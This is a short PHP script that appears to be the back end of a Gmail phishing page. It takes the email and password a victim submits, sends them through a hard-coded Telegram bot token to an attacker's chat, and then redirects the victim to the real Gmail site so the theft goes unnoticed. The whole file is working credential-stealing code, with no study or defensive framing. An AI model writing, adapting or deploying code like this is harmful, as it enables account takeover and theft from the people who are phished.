php
<?php
$token = "8023739634:AAFhFe-w9iJNNAVyQJqf6ioVTZugNOdAn30";
$chat_id = "YOUR_CHAT_ID"; // Replace with your chat ID
$email = $_POST['email'];
$password = $_POST['password'];

$message = "New Gmail Credentials:\nEmail: $email\nPassword: $password";

$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
file_get_contents($url);

header("Location: https://mail.google.com"); // Redirect to real Gmail login page
exit();
?>
